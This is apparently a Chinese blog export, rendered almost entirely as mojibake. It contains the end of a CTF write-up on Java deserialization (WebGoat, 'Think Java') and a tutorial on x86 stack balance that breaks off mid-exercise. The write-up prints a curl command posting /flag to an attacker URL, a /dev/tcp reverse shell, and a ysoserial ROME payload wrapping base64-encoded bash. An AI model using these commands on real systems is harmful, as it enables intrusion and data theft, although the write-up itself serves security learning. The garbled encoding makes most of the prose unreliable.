è¿™é‡Œé—®äº†ä¸€ä¸‹GPTä¸Šè¿°payloadçš„å«ä¹‰ï¼š è¿™æ®µå‘½ä»¤ä½¿ç”¨`curl`å·¥å…·è¿›è¡ŒHTTPè¯·æ±‚ï¼Œå¹¶åŒ…å«äº†ä¸€äº›å‚æ•°å’Œé€‰é¡¹ã€‚è®©æˆ‘ä»¬é€æ­¥è§£é‡Šè¿™ä¸ªå‘½ä»¤ï¼š 1. `curl`: æ˜¯ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºåœ¨Unixå’Œç±»Unixç³»ç»Ÿä¸­ä¼ è¾“æ•°æ®ï¼Œæ”¯æŒå¤šç§åè®®ï¼ŒåŒ…æ‹¬HTTPã€‚ 2. `http://xxx`: æŒ‡å®šäº†è¦è®¿é—®çš„URLï¼Œå…¶ä¸­`xxx`æ˜¯å ä½ç¬¦ã€‚ä½ éœ€è¦æ›¿æ¢å®ƒä¸ºå®é™…çš„ç›®æ ‡URLã€‚ 3. `-d`: è¿™æ˜¯`curl`çš„ä¸€ä¸ªé€‰é¡¹ï¼Œç”¨äºæŒ‡å®šè¦å‘é€çš„æ•°æ®ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œ`-d @/flag`è¡¨ç¤ºå°†`/flag`æ–‡ä»¶ä¸­çš„æ•°æ®ä½œä¸ºPOSTè¯·æ±‚çš„ä¸»ä½“æ•°æ®å‘é€åˆ°æŒ‡å®šçš„URLã€‚`@`ç¬¦å·å‘Šè¯‰`curl`ä»æ–‡ä»¶ä¸­è¯»å–æ•°æ®ã€‚ æ€»çš„æ¥è¯´ï¼Œè¿™ä¸ªå‘½ä»¤çš„ç›®çš„æ˜¯é€šè¿‡HTTP POSTè¯·æ±‚å°†`/flag`æ–‡ä»¶çš„å†…å®¹å‘é€åˆ°æŒ‡å®šçš„URLï¼ˆæ›¿æ¢ä¸ºå®é™…çš„ç›®æ ‡URLï¼‰ã€‚åœ¨å®é™…åº”ç”¨ä¸­ï¼Œè¯·ç¡®ä¿ä½ äº†è§£å¹¶æˆæƒäº†å‘é€æ•°æ®çš„æ“ä½œï¼Œä»¥å…ä¸å½“ä½¿ç”¨ã€‚ æ¥ç€å°è¯•ä¸€ä¸‹åå¼¹shellï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š bash -i &gt;&amp; /dev/tcp/ip/port 0&gt;&amp;1 --è¿›è¡Œbase64ç¼–ç  java -jar ysoserial-all.jar ROME \"bash -c {echo,ç¼–ç å†…å®¹}|{base64,-d}|{bash,-i}\" &gt; 1.bin --è¿›è¡Œbase64ç¼–ç  æ¥ç€å‘é€è‡³currentæ¥å£å³å¯ï¼Œå¦‚ä¸‹å›¾æˆåŠŸæ‹¿åˆ°shell è¿™é‡Œæˆ‘ä»¬ç”¨ysoserialå¯¹ç”¨æˆ·ç™»å½•æˆåŠŸçš„æ•°æ®åˆ†æä¸€ä¸‹ Bearer rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu ä¸è¿‡åœ¨æ­¤ä¹‹å‰éœ€è¦å°†ä¸Šè¿°è½¬ä¸º16è¿›åˆ¶ï¼Œè¿™é‡Œä¾æ—§ç”¨ä¸ªpythonè„šæœ¬ import base64 a = \"rO0ABXNyABhjbi5hYmMuY29yZS5tb2RlbC5Vc2VyVm92RkMxewT0OgIAAkwAAmlkdAAQTGphdmEvbGFuZy9Mb25nO0wABG5hbWV0ABJMamF2YS9sYW5nL1N0cmluZzt4cHNyAA5qYXZhLmxhbmcuTG9uZzuL5JDMjyPfAgABSgAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAAAAAAAAXQABWFkbWlu\" b = base64.b64decode(a).encode('hex') print(b) æˆ‘ä»¬è¿›å…¥æ–‡ä»¶ä¼šå‘ç°å¦‚ä¸‹å›¾ï¼Œnameä¸­å«æœ‰adminï¼Œè¯´æ˜è¿™é‡Œä»£ç é€šè¿‡ååºåˆ—åŒ–Javaæ•°æ®æ¥åˆ¤æ–­å…¶ä¸­nameçš„å€¼æ˜¯å¦ä¸ºadmin 0x09 å‚è€ƒæ–‡ç«  Javaååºåˆ—åŒ–1ï¼š Java ååºåˆ—åŒ–æ¼æ´å…¥é—¨ Javaååºåˆ—åŒ–1ä»å…¥é—¨åˆ°æ”¾å¼ƒ æµ…æ˜¾æ˜“æ‡‚çš„Javaååºåˆ—åŒ–1å…¥é—¨ Javaåå°„ï¼š JAVAåå°„å­¦ä¹  åˆæ¢javaå®‰å…¨ä¹‹åå°„(2) Javaåå°„ webgoatï¼š 0åŸºç¡€å­¦æ¸—é€-WebGoaté¶åœºï¼ˆäº”ï¼‰ WebGoat8.0 Insecure Deserialization webgoat-Insecure Deserializationä¸å®‰å…¨çš„åºåˆ—åŒ– WebGoat-8.2.2é¶åœºä¹‹ä¸å®‰å…¨çš„ååºåˆ—åŒ–æ¼æ´ Swaggeræœªæˆæƒè®¿é—®æ¼æ´ [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java -1 [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java -2 CTFHUB-think_java(2020-ç½‘é¼æ¯-æœ±é›€ç»„-Web-think_java)","tags":["Javaååºåˆ—åŒ–"],"categories":["Javaååºåˆ—åŒ–"]},{"title":"å †æ ˆå¹³è¡¡çš„å­¦ä¹ ","path":"/2023/11/22/qian-xi-dui-zhan-ping-heng/","content":"0x01 å †æ ˆå¹³è¡¡ #include&lt;stdio.h&gt; int Hello(int a, int b){ return a+b; } int main(){ int a = 1; int b = 2; Hello(a,b); return 0; } ä¸Šè¿°å†™çš„ç®€å•çš„Cç¨‹åºï¼Œæˆ‘ä»¬å…ˆæ‰¾å¯»ä¸€ä¸‹mainå‡½æ•°å…¥å£ï¼Œè¿™é‡Œæ¯•ç«Ÿæˆ‘ä¹Ÿæ˜¯èœé¸¡ï¼Œçœ‹äº†å‡ ç¯‡æ–‡ç« æ„Ÿè§‰è¿˜æ˜¯ä¸å¤ªä¼šæ‰¾å…¥å£ï¼Œäºæ˜¯åˆæƒ³ç€ç”¨IDAæ‰“å¼€æ‰¾mainå‡½æ•°ï¼Œæœä¸å…¶ç„¶æ‰¾åˆ°äº† æˆ‘ä»¬åœ¨dgbå¯¹åº”åœ°å€ä¸Šæ‰“ä¸ªæ–­ç‚¹è¿è¡Œåˆ°mainå‡½æ•°ä½ç½®ï¼Œè¿è¡Œåˆ°æ­¤å¤„ã€‚ è¿™é‡Œåˆæ‰¾åˆ°äº†æ»´æ°´é€†å‘çš„è¯¾ä»¶ï¼Œäºæ˜¯æˆ‘æƒ³ç€ç›´æ¥æ¢æˆè‡ªå¸¦çš„helloworld.exeæ¥ç”»å †æ ˆå›¾ è‡³äºä¸ºä½•æ˜¯å›¾ä¸­çš„åœ°å€ï¼Œè¿™é‡Œä¹Ÿæ˜¯è·Ÿç€æ•™ç¨‹èµ°çš„ï¼Œæ²¡åˆ«çš„åŸå› ã€‚å…ˆè®°å½•ä¸€ä¸‹espä¸ebpå¯„å­˜å™¨åœ°å€ï¼ˆè®°å¾—ç‚¹æ–­ç‚¹ä¹‹åè¿è¡Œåˆ°æ­¤å¤„ï¼‰ EBPä¸ºæ ˆåº•ï¼ŒESPä¸ºæ ˆé¡¶ï¼Œæ¥ç€æˆ‘ä»¬F8æ­¥èµ°ã€‚è¿™ä¸ªé»„è‰²å°±ä»£è¡¨äº†ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨ä¹‹å‰ï¼Œä½ åŸå§‹çš„å †æ ˆå°±æ˜¯è¿™æ ·çš„ï¼Œè¿™é‡Œé¢çš„æ•°æ®æ˜¯åœ¨æˆ‘çš„ç¨‹åºåœ¨æ‰§è¡Œä¹‹å‰å°±å·²ç»è¢«å ç”¨çš„äº† å¯ä»¥çœ‹åˆ°æ ˆåº•æœªå˜åŒ–ï¼Œæ ˆé¡¶å‘ç”Ÿäº†å˜åŒ–ï¼ˆ-4ï¼‰ï¼Œè¿™é‡Œæ˜¯ç”±äºæˆ‘ä»¬push 2è¿™ä¸€æ­¥çš„åŸå›  å³ä¸‹è§’ä¹Ÿå¯ä»¥çœ‹åˆ°2çš„äº§ç”Ÿï¼Œè¿™ä»£è¡¨2å·²ç»å†™å…¥å †æ ˆä¸­äº†ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšå‹æ ˆã€‚ å†F8æ­¥èµ°ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾1ä¹ŸæˆåŠŸå…¥æ ˆï¼Œåœ°å€ä¹Ÿå‘ç”Ÿå˜åŒ– æ¥ç€ä¸‹ä¸€æ­¥å°±ä¸èƒ½ç›´æ¥F8äº†ï¼Œå› ä¸ºè¿™å›çš„æŒ‡ä»¤ä¸ºcallï¼Œé€‚ç”¨äºè°ƒç”¨å‡½æ•°çš„ï¼Œå¦‚æœç›´æ¥F8ï¼Œå°±åˆ°äº†add espçš„ä¸€æ­¥ï¼Œè€Œæˆ‘ä»¬æ˜¯æƒ³è¦è¿›å…¥è¿™ä¸ªå‡½æ•°å†…éƒ¨çš„ï¼Œå› æ­¤è¿™é‡Œéœ€è¦F7æ­¥è¿›ï¼Œcallå‡½æ•°å·¦åè‚¯å®šä¼šå¯¹åº”ä¸€ä¸ªretï¼ˆç”¨äºç»ˆæ­¢å½“å‰å‡½æ•°çš„è¿è¡Œï¼Œå³å›æ”¶å½“å‰å‡½æ•°çš„å¸§ï¼‰ã€‚è¿™é‡Œçœ‹åˆ°æ•™ç¨‹è¯´ï¼Œcallè¿™ä¸ªå‡½æ•°ä¿®æ”¹EIPå€¼çš„åŒæ—¶ï¼Œè¿˜ä¼šå°†è¿™è¡ŒæŒ‡ä»¤çš„åœ°å€å‹å…¥æ ˆä¸­ã€‚ åœ°å€å€¼ï¼šEIP+æŒ‡ä»¤é•¿åº¦ è¿™é‡Œä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥šæŒ‡ä»¤é•¿åº¦ä»£è¡¨å¤šå°‘ï¼Œä¸è¿‡å€’æ˜¯å¯ä»¥è®¡ç®—å™¨ç®—å‡ºæ¥ã€‚ã€‚ã€‚ è¿™é‡Œä¸ä¸Šå›¾æ¯”è¾ƒçœ‹åˆ°ESPåˆ-4ï¼Œå½“æˆ‘ä»¬å†æåˆ°å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè¯´çš„å°±æ˜¯callè°ƒç”¨çš„æ—¶å€™ï¼Œæ ˆé‡Œé¢è¢«å‹å…¥çš„å€¼ã€‚ è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°å…¶ä¸­å«æœ‰JMPæŒ‡ä»¤ï¼šæ— æ¡ä»¶è½¬ç§»åˆ°æ ‡å·ä¸ºlabelçš„ä½ç½®ã€‚ä¹Ÿå°±æ˜¯è·³è½¬æŒ‡ä»¤ï¼Œè·³è½¬åˆ°æŒ‡å®šä½ç½®ã€‚è¿™é‡Œçœ‹çš„æ•™ç¨‹è¯´æ˜¯ä¸éœ€è¦ç†ä»–ï¼Œç›´æ¥å›è½¦å°±è¡Œã€‚ è¿™é‡Œå›è½¦åå†çœ‹ä¸€ä¸‹EIPçš„å€¼ï¼Œæˆ‘ä»¬ä¸ä¸Šé¢æ¯”è¾ƒçš„è¯ä¼šå‘ç°ï¼Œè¿™ä¸ªå€¼ä¸callè°ƒç”¨çš„æ—¶å€™çš„åœ°å€ä¸€æ ·ï¼Œè¿™é‡Œæ•™ç¨‹è¯´æ˜¯JMPç›¸å½“äºmovå€¼ç»™EIPï¼Œæ•…æ­¤EIPçš„å€¼ä¼šå˜åŒ–ã€‚æ¥ç€æˆ‘ä»¬è€è§„çŸ©F8ã€‚ è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨push EBPä¹‹åï¼ŒESPçš„å€¼åˆ-4ï¼ŒåŒæ—¶æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å³ä¸‹è§’æ ˆé¡¶çš„å€¼å°±æ˜¯å½“å‰EBPçš„å€¼ã€‚ è¿™é‡Œç»§ç»­F8çœ‹åˆ°ä¸Šå›¾åœ¨mov EBPï¼Œ ESPä¹‹åçœ‹åˆ°å³ä¸Šè§’å‘ç°ï¼ŒEBP=ESPï¼ˆæœ¬è´¨æ„ä¹‰å°±ç®—æ˜¯æ ˆåº•æé«˜äº†ï¼‰ åŒæ—¶æˆ‘ä»¬å‘ç°ä¸‹ä¸€æ­¥çš„sub esp,40ï¼Œä¾æ®ä¸Šå›¾çš„è§£é‡Šè¿™é‡Œä¸éš¾çœ‹å‡ºï¼Œæˆ‘ä»¬espçš„å€¼-40ï¼Œç”±äº40æ˜¯åå…­è¿›åˆ¶ï¼Œæ‰€ä»¥ç›¸å½“äºåè¿›åˆ¶çš„16ï¼Œæ•…æ­¤è¦ä¸Šå‡16æ ¼ã€‚ ä¹‹åæˆ‘ä»¬F8æ¥æ ¸å¯¹ä¸€ä¸‹æˆ‘ä»¬è®¡ç®—æ˜¯å¦æ­£ç¡®ï¼š å¦‚ä¸Šå›¾ï¼Œå‘ç°espçš„å€¼ä¸æˆ‘ä»¬ç”»çš„å †æ ˆå›¾æ˜¯ä¸€è‡´çš„ã€‚è¿™é‡Œä»‹ç»ä¸€ä¸‹ç¼“å†²åŒºçš„æ¦‚å¿µï¼š ç¼“å†²åŒºçš„æ¦‚å¿µï¼šä»»ä½•ä¸€æ®µç¨‹åºåœ¨æ‰§è¡Œéƒ½éœ€è¦ä¸€ç‚¹ç©ºé—´ï¼Œä¸ç»™æˆ‘ä¸€å—å†…å­˜æ€ä¹ˆæ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦ä¸€å—ç©ºé—´å«åšç¼“å†²åŒºï¼Œç¼“å†²åŒºçš„å¤§å°æ—¶ä¸ç¡®å®šçš„ï¼Œä»–ä¼šæ ¹æ®ä½ éœ€è¦çš„å¤šå°‘æ¥åˆ† ä¸Šå›¾æ˜¯PUSH EBXçš„ç»“æœã€‚åœ¨è¿™é‡Œé™„ä¸Šæ–‡ç« çš„è§£é‡Šï¼š ä¸ºä»€ä¹ˆç¨‹åºè¦è¿™ä¹ˆè®¾è®¡ï¼šå› ä¸ºä½ è®©CPUå¹²æ´»ï¼Œè®©ä»–å»æ‰§è¡Œä¸€æ®µåŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦ç»™ä»–åˆ†ä¸€å—å†…å­˜ï¼Œæ‰€ä»¥ä¸Šé¢ä¸ºä»€ä¹ˆæœ‰ä¸€æ¡SUB ESPï¼Œ40è¿™ä¸ªåŸå› ï¼Œä¸ºä»€ä¹ˆè¿˜æœ‰ä¸€å †PUSH EBX ESI EDIè¿™äº›ä¸œè¥¿ï¼Œæˆ‘ä»¬è¦æ‰§è¡Œä¸€æ®µç¨‹åºï¼Œå¦‚æœè¯´æˆ‘ä»¬ç°åœ¨åœ¨ç©æ¸¸æˆï¼Œä¸€å…±30å…³ç°åœ¨ç©åˆ°äº†29å…³ï¼Œç°åœ¨çªç„¶æƒ³èµ·æ¥æˆ‘è¦å»åƒé¥­ï¼Œåƒé¥­å°±ç›¸å½“äºæˆ‘è¦æ‰§è¡Œå¦å¤–ä¸€æ®µç¨‹åºï¼Œå¦‚æœä½ åƒå®Œé¥­å›æ¥å‘ç°ä½ è¦ä»ç¬¬ä¸€å…³å¼€å§‹ä½ å¹²ä¸å¹²ï¼Œæ‰€ä»¥ä¸€æ ·çš„é“ç†ï¼Œæ‰€ä»¥è¿™äº›å¯„å­˜å™¨ä¸€å…±å°±è¿™äº›ä¸ªï¼Œåœ¨æˆ‘ä»¬ç”¨ä¹‹å‰æ˜¯ä¸æ˜¯æˆ‘ä»¬éœ€è¦æŠŠä»–ä¿ç•™èµ·æ¥ï¼Œç­‰æˆ‘ä»¬æ‰§è¡Œå®Œäº†ï¼Œæˆ‘ä»¬å†è¿˜åŸå›æ¥ï¼Œæ‰€ä»¥PUSH é‚£ä¸‰ä¸ªå¯„å­˜å™¨çš„æ­¥éª¤æˆ‘ä»¬å¯ä»¥ç†è§£ä¸ºä¿å­˜ç°åœºï¼Œå¯„å­˜å™¨é‡Œé¢å­˜çš„å€¼ä¿å­˜åˆ°å“ªé‡Œå»ï¼Œæˆ‘ä»¬å†ç¼–ç¨‹çš„æ—¶å€™ï¼Œå°±ä¸¤ä¸ªåœ°æ–¹å¯ä»¥ä¿å­˜è¿›å»ï¼Œä¸€ä¸ªæ˜¯å¯„å­˜å™¨ï¼Œä¸€ä¸ªæ˜¯å†…å­˜ï¼Œé‚£ä¿å­˜åˆ°å“ªä¸ªå†…å­˜é‡Œé¢ï¼Œé‚£ä¹ˆæ­£å¥½æ˜¯æˆ‘ä»¬ç°åœ¨ç”¨çš„å †æ ˆ è¿™é‡Œæˆ‘ä»¬æ‰§è¡Œä¸€ä¸‹push ebxä¸ediï¼Œé‚£æ ¹æ®è®¡ç®—æˆ‘ä»¬pushä¹‹åï¼Œespçš„å€¼åº”è¯¥ä»¥E8Cç»“å°¾ æ¥ç€æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ï¼Œå¦‚ä¸‹å›¾éªŒè¯æˆåŠŸï¼Œebxï¼ŒediæˆåŠŸå…¥æ ˆï¼ˆå¯ä»¥çœ‹åˆ°å³ä¸‹è§’çš„æ ˆä¸­å«æœ‰ä¸Šé¢EDI,EBXçš„åœ°å€å€¼ï¼‰ è¿™é‡Œä¿®æ”¹ä¸€ä¸‹ä¸Šé¢çš„å †æ ˆå›¾ï¼ˆæœ‰æ‰€é”™è¯¯ï¼‰ï¼Œå¦‚ä¸‹å›¾ï¼Œæˆ‘ä»¬çš„EBPæ˜¯åœ¨å‰å‡ æ­¥å·²ç»å˜äº†çš„ï¼Œæˆ‘è¿™é‡Œå¿˜è®°æ”¹äº†ã€‚ LEAæ˜¯å–åœ°å€ç¼–å·çš„ï¼Œå–EBP-40è¿™å—çš„åœ°å€ç¼–å·ç„¶åæ”¾åˆ°EDIé‡Œé¢ï¼Œè¿™é‡Œç»è¿‡è®¡ç®—å‘¢ï¼Œæˆ‘ä»¬çš„EDIçš„å€¼åº”è¯¥æ˜¯ä»¥FE98ç»“å°¾çš„ï¼Œæˆ‘ä»¬F8éªŒè¯ä¸€ä¸‹ å¯ä»¥çœ‹åˆ°éªŒè¯æˆåŠŸï¼Œä½†å†ç»†çœ‹ä¸€ä¸‹å‘ç°å…¶ä»–å¯„å­˜å™¨çš„å€¼å¦‚EBPï¼ŒESPçš„å€¼å¹¶æœªå‘ç”Ÿå˜åŒ–ã€‚ è¯´æ˜LEAåªæ˜¯å•çº¯æ”¹å˜EDIçš„å€¼ã€‚ æ¥ä¸‹æ¥åˆ†æï¼š MOV ECX,10 MOV EAX,CCCCCCCC REP STOS DWORD PTR ES:[EDI] ä½†è¿™é‡Œä¸çŸ¥ä¸ºä½•ï¼Œè¿™é‡Œçš„ä»£ç ä¸ä¸Šè¿°å›¾ä¸­ä¸ç¬¦ï¼Œé—®äº†GPTå‘ç°åŠŸèƒ½æ˜¯ç›¸åŒçš„ï¼Œä½†ä½¿ç”¨çš„å‘½ä»¤ä¸ä¸€æ ·ç½¢äº† æ˜¯çš„ï¼Œè¿™ä¸¤è€…åœ¨åŠŸèƒ½ä¸Šæ˜¯ç›¸åŒçš„ã€‚ 1. `REP STOS DWORD PTR ES:[EDI]` ä¸­çš„ `STOS` æ˜¯å­˜å‚¨å­—èŠ‚æˆ–åŒå­—èŠ‚çš„æŒ‡ä»¤ï¼Œè€Œ `DWORD PTR` è¡¨ç¤ºæ“ä½œæ•°æ˜¯ä¸€ä¸ªåŒå­—ï¼ˆ32ä½ï¼‰ã€‚ 2. `REP STOSD` ä¸­çš„ `STOSD` ä¹Ÿæ˜¯å­˜å‚¨åŒå­—èŠ‚çš„æŒ‡ä»¤ï¼Œå…¶ä¸­ `D` è¡¨ç¤ºåŒå­—ã€‚ å› æ­¤ï¼Œè¿™ä¸¤è€…éƒ½æ˜¯é‡å¤æ‰§è¡Œç›¸åŒçš„å­˜å‚¨æ“ä½œï¼Œåªæ˜¯æŒ‡å®šçš„æ–¹å¼ç•¥æœ‰ä¸åŒã€‚å‰è€…ä½¿ç”¨äº†æ˜¾å¼çš„åœ°å€è¡¨ç¤ºï¼ˆ`DWORD PTR ES:[EDI]`ï¼‰ï¼Œè€Œåè€…ç›´æ¥ä½¿ç”¨é»˜è®¤çš„å¯„å­˜å™¨ï¼ˆ`STOSD`ï¼‰ã€‚åœ¨å®é™…ä½¿ç”¨ä¸­ï¼Œé€‰æ‹©å“ªä¸ªå–å†³äºå…·ä½“çš„éœ€æ±‚å’Œç¼–ç¨‹ä¸Šçš„åå¥½ã€‚ è¿™é‡Œçœ‹wpè¯´æ˜¯REPä¼šå—åˆ°ECXçš„å½±å“ï¼ŒECXçš„å€¼æ˜¯å¤šå°‘REPå°±æ‰§è¡Œå‡ æ¬¡ï¼Œè¿™é‡Œæ˜¯æ‰§è¡Œ16æ¬¡ï¼Œå› ä¸º10æ˜¯åå…­è¿›åˆ¶ è¿™é‡Œå‘¢ï¼Œå…ˆæ˜¯å°†ECXèµ‹å€¼ä¸º10ï¼Œå…¶æ¬¡å°†EAXèµ‹å€¼ä¸ºCCCCCCCCï¼Œè¿™é‡ŒSTOSçš„ä½œç”¨æ˜¯ï¼š å°†EAXçš„å€¼èµ‹å€¼ç»™EDIè¿™ä¸ªåœ°å€ç¼–å·æŒ‡å‘çš„å†…å­˜ï¼Œè¿™ä¸ªé‡Œé¢çš„EDIä¼šè‡ªåŠ¨åŠ 4æˆ–è€…å‡4ï¼Œè¿™æ˜¯æœ‰Dä½å†³å®šçš„ï¼ŒDä½ä¸º0å°±æ˜¯åŠ ï¼ˆä¸è¿‡å¯¹äºè¿™ä¸ªè§£é‡Šæ²¡å¤ªæ‡‚ï¼‰ã€‚è€Œè¿™ä¸‰æ¡å‘½ä»¤åŠ èµ·æ¥æ„æ€å°±æ˜¯ï¼šæ¯æ¬¡å°†EAXè¿™ä¸€ä¸²CCæ”¾å…¥EDIæ‰€æŒ‡å‘çš„åœ°å€ï¼Œå…±æ“ä½œ16æ¬¡ï¼Œä½†æ¯æ¬¡æ”¾å…¥ä¹‹åEDIä¼š+4ï¼Œ+4åECXä¼šè‡ªåŠ¨-1ï¼ŒCCç›¸å½“äºinit3ï¼Œç›¸å½“äºæ–­ç‚¹ï¼Œé˜²æ­¢ç¼“å†²åŒºæº¢å‡ºã€‚ é‚£æˆ‘ä»¬åˆ†æä¸€ä¸‹å †æ ˆå›¾ï¼Œåœ¨ä¸Šé¢çš„æˆ‘ä»¬çŸ¥é“EDIå½“å‰åœ°å€ä¸º0019FE98ï¼Œä¹Ÿå°±æ˜¯ä¸‹å›¾ é‚£è¿™é‡Œéœ€è¦æ“ä½œ16æ¬¡ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬ä»E98é‚£é‡Œå¼€å§‹ä¸€ç›´åˆ°EBPçš„ä¸Šé¢ä¸€æ ¼ï¼Œå…±16æ ¼ï¼Œéƒ½å°†ä¼šæˆä¸ºCCè¿™ä¸€ä¸²å­—ç¬¦ æœ€ç»ˆç»“æœå¦‚ä¸Šå›¾ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éªŒè¯ä¸€ä¸‹ä¸Šè¿°çš„è®¨è®º å¦‚ä¸Šå›¾ï¼Œè¿™é‡Œæ˜¯æœªå˜åŒ–ä¹‹å‰ï¼Œå¦‚ä¸‹å›¾ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œåœ¨94ä¸€ç›´åˆ°D8ä¹‹é—´çš„éƒ½å˜æˆäº†CCï¼ŒéªŒè¯æˆåŠŸ MOV EAXï¼ŒDWORD PTR SSï¼š[EBP+8] ADD EAXï¼ŒDWORD PTR SSï¼š[EBP+C] ä¸Šè¿°ä»£ç å«ä¹‰ä¸ºï¼Œå–EBP+8æ‰€å¾—åˆ°çš„åœ°å€çš„å€¼ï¼Œèµ‹å€¼ç»™EAXï¼Œæ¥ç€å–EBP+Cå¾—åˆ°çš„åœ°å€çš„å€¼ï¼Œä¸EAXçš„å€¼ç›¸åŠ ï¼Œèµ‹å€¼ç»™EAX æˆ‘ä»¬æ ¹æ®ä¸Šè¿°çš„å †æ ˆå›¾ï¼Œå¯ä»¥çœ‹åˆ°EBP+8å°±æ˜¯1ï¼ŒEBP+Cå°±æ˜¯2ï¼Œæ‰€ä»¥ä¸Šè¿°æ­¥éª¤çš„å«ä¹‰å°±æ˜¯EAX=1+2=3 æ¥ç€æˆ‘ä»¬F8éªŒè¯ä¸€ç•ª å¯ä»¥çœ‹åˆ°ä¸Šå›¾å³ä¸Šè§’EAXå˜ä¸º3ï¼Œç´§æ¥ç€æ˜¯pop ediï¼Œpop esiï¼Œpop ebx å¯¹åº”äºå †æ ˆå›¾ï¼Œè¿™é‡Œå°±æ˜¯å°†EDIï¼ŒESIï¼ŒEBXçš„å€¼æ”¾åˆ°å¯„å­˜å™¨ä¸­ å †æ ˆå›¾å¦‚ä¸Šï¼ŒéªŒè¯å¦‚ä¸‹ï¼š å¦‚ä¸Šå›¾æˆ‘ä»¬çœ‹åˆ°ESPçš„å€¼æˆåŠŸ-12åˆ°E98çš„å€¼ éšååˆmov espï¼Œebpï¼Œè¿™é‡Œæ˜¯å°†ebpçš„å€¼èµ‹å€¼ç»™espï¼Œä¹Ÿå°±æ˜¯ä¸Šè¿°å †æ ˆå›¾ä¸­çš„CCä¸€ä¸²æ•°æ®æ²¡äº†ï¼Œå †æ ˆå›¾å¦‚ä¸‹ï¼š éªŒè¯å¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ESPä¸EBPçš„å€¼ä¸€è‡´ï¼ˆè¿™ä¸ªè¿‡ç¨‹å«åšæ¢å¤å †æ ˆï¼‰ï¼Œè‡³äºå‡½æ•°æ‰§è¡Œå®Œåœ¨å †æ ˆé‡Œé¢çš„å€¼å°±ä¸è¦äº†ï¼Œæ‰€ä»¥å°±ä¼šäº§ç”Ÿæ•°æ®åƒåœ¾ è¿™é‡Œåšä¸€ä¸‹ä¿®æ”¹ï¼Œå› ä¸ºCCè¿™ä¸²åƒåœ¾æ•°æ®æ˜¯ä¾æ—§å­˜åœ¨çš„ï¼Œæ‰€ä»¥å †æ ˆå›¾åº”è¯¥æ˜¯è¿™æ ·çš„ï¼š å¦‚ä¸Šå›¾ï¼Œå¯ä»¥çœ‹åˆ°CCä¸€ä¸²æ•°æ®ä¾æ—§å­˜åœ¨ï¼Œæœ€åæ˜¯pop ebpï¼Œå°†ebpå‡ºæ ˆ æ‰§è¡Œå®Œæˆ‘ä»¬çœ‹åˆ°ä¸Šå›¾ä¸­EBPçš„å€¼æ¢å¤åŸæ ·ï¼Œæ¢å¤äº†åŸæ¥çš„æ ˆåº•ï¼ˆå¯ä»¥å¯¹æ¯”æ–‡ç« å¼€å¤´çš„ï¼‰ æœ€åè¿›è¡Œäº†retï¼Œä¸è¿‡çœ‹å…¶ä»–æ–‡ç« è¿™é‡Œæ˜¯RETNï¼Œå…¶æœ¬è´¨æ˜¯pop eipï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æœ€å¼€å§‹callè°ƒç”¨å‡½æ•°çš„åœ°æ–¹ï¼Œå³å°†eipçš„å€¼å‡ºæ ˆï¼Œeipï¼š401171ï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯æˆ‘ä»¬çš„å‡½æ•°è¿”å›åœ°å€ï¼Œè¿™é‡Œæ‰§è¡Œå®Œä¹‹åï¼Œå †æ ˆå›¾åº”è¯¥å¦‚ä¸‹ï¼š éªŒè¯å¦‚ä¸‹ï¼š ä¸Šå›¾æ‰€ç¤ºï¼ŒEIPçš„å€¼æ¢å¤äº†4001171ï¼Œåˆ°ç›®å‰ä¸ºæ­¢æˆ‘ä»¬å°±è¾¾åˆ°äº†å †æ ˆå¹³è¡¡ï¼š å †æ ˆå¹³è¡¡ï¼šè°ƒç”¨å‡½æ•°ä¹‹å‰å’Œè°ƒç”¨å‡½æ•°ä¹‹åä½ çš„å †æ ˆåº”è¯¥æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯æ²¡æœ‰å˜åŒ–çš„ï¼Œæˆ‘ä»¬å«åšå †æ ˆå¹³è¡¡ ADD ESPï¼Œ8 æˆ‘ä»¬åœ¨å¤–é¢ç»´æŒäº†å †æ ˆå¹³è¡¡ï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªå«åšå¤–å¹³æ ˆã€‚ å®Œç»“æ’’èŠ±ï¼ 0x02 è¿˜åŸCä»£ç  è¿™é‡Œé€†å‘çš„å¸ˆå‚…ç»™äº†æˆ‘ä¸€ä¸ªå°ç»ƒä¹ ï¼Œå°†æ±‡ç¼–æŒ‡ä»¤è¿˜åŸä¸ºCä»£ç ï¼Œå†…å®¹å¦‚ä¸‹ï¼š ;test1 .text:000011B1 var_4= dword ptr -4 .text:000011B1 arg_0= dword ptr 8 .text:000011B1 55 push ebp .text:000011B2 89 E5 mov ebp, esp .text:000011B4 83 EC 10 sub esp, 10h .text:000011C1 C7 45 FC 00 00 00 00 mov [ebp+var_4], 0 .text:000011C8 83 7D 08 00 cmp [ebp+arg_0], 0 .text:000011CC 79 09 jns short loc_11D7 .text:000011CC .text:000011CE C7 45 FC 01 00 00 00 mov 